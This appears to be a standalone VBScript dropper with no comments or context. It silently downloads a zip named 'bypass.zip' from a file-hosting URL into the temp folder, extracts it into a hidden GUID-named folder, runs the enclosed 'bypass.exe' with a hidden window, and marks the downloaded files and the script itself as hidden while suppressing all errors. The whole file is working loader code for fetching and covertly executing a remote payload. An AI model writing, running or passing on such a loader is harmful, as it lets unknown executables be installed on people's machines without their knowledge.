On Error Resume Next
Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP")
temp = objShell.ExpandEnvironmentStrings("%TEMP%")
zipUrl = "https://files.catbox.moe/cnjyvm.zip"
zipPath = temp & "\bypass.zip"
extPath = temp & "\9C6A2D99-9B06-4E37-A0B1-351087Z15A81"

objHTTP.Open "GET", zipUrl, False
objHTTP.Send
If objHTTP.Status = 200 Then
    Set objStream = CreateObject("ADODB.Stream")
    objStream.Open
    objStream.Type = 1
    objStream.Write objHTTP.ResponseBody
    objStream.SaveToFile zipPath, 2
    objStream.Close

    objFSO.GetFile(zipPath).Attributes = objFSO.GetFile(zipPath).Attributes Or 2
End If

If Not objFSO.FolderExists(extPath) Then
    Set newFolder = objFSO.CreateFolder(extPath)
    newFolder.Attributes = newFolder.Attributes Or 2
End If

Set objZip = CreateObject("Shell.Application")
Set objFolder = objZip.NameSpace(zipPath)
If Not objFolder Is Nothing Then
    objZip.NameSpace(extPath).CopyHere objFolder.Items, 16
    If objFSO.FileExists(zipPath) Then 
        objFSO.GetFile(zipPath).Attributes = objFSO.GetFile(zipPath).Attributes Or 2
    End If
End If

exePath = extPath & "\bypass.exe"
If objFSO.FileExists(exePath) Then
    objFSO.GetFile(exePath).Attributes = objFSO.GetFile(exePath).Attributes Or 2
    objShell.Run exePath, 0, False
End If

vbsPath = WScript.ScriptFullName
If objFSO.FileExists(vbsPath) Then
    objFSO.GetFile(vbsPath).Attributes = objFSO.GetFile(vbsPath).Attributes Or 2
End If
